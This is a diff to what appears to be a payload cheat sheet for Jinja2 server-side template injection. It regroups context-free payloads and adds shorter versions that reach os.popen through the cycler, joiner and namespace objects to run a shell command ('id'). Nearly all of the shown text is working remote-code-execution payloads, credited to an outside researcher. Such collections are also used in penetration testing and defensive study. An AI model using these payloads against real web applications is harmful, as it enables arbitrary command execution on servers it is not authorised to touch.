@@ -503,14 +503,20 @@ These payloads are context-free, and do not require anything, except being in a 
 
 ```python
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
-```
 
-```python
 {{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+
+{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
 ```
 
+We can use these shorter payloads (this is the shorter payloads known yet):
+
 ```python
-{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
 ```
 
 Source [@podalirius_](https://twitter.com/podalirius_) : https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/
